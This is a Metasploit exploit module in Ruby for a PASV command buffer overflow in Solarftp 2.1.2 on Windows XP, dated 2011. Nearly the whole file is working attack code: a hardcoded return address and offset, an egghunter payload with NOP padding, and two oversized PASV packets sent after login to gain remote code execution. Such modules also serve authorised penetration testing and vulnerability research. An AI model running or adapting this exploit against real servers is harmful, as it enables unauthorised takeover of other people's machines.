# Date: Aug 17, 2011
# Author: qnix
# Software Link: http://solarftp.com/files/solarftps-setup.exe
# Version: 2.1.2
# Tested on: Windows XP Universal
# Detailed info: http://0x80.org/blog/?p=545
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
    include Msf::Exploit::Remote::Ftp
    include Msf::Exploit::Remote::Egghunter
     
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Solarftp 2.1.2 PASV Command Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a buffer overflow in the PASV command in Solarftp 2.1.2
                You must have valid credentials to trigger this vulnerability. Also, you
                ony get one chance.
            },
            &#039;Author&#039;         => &#039;qnix&#039;,
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://0x80.org/blog/?p=545&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;WfsDelay&#039; => 45,
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00\x20\x0a\x0d",
                    &#039;StackAdjustment&#039;       => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                                                       #1001BD23   . FFE0   JMP EAX  @sfsweb.dll
                    [ &#039;Windows XP Universal&#039;,       { &#039;Ret&#039; => 0x1001BD23, &#039;Offset&#039; => 195} ],
                ],
            &#039;DisclosureDate&#039; => &#039;Aug 17 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
 
    def exploit
        connect_login
        print_status("Trying target #{target.name}")
 
        print_status("Creating Egg Hunter")
        eggoptions =
        {
        :checksum => true,
        :eggtag   => "W00T"
        }
        hunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)
         
        fix = "\x11"        # To fix some left overs from uncontrolled buffer
                            # to avoid access violation.
        pk1 = make_nops(75)
        pk1 << fix
        pk1 << make_nops(20)
        pk1 << hunter
        pk1 << make_nops((100-fix.length-hunter.length))
        pk1 << [target.ret].pack(&#039;V&#039;)
        pk1 << egg
        pk1 << make_nops(6631-[target.ret].length-target[&#039;Offset&#039;]-egg.length)
        print_status("Sending first packet...")
        send_cmd( ["PASV",pk1], false)
         
        pk2 = make_nops(3000)
        print_status("Sending second packet...")
        send_cmd( ["PASV",pk2], false)
         
        handler
        disconnect
    end
 
end



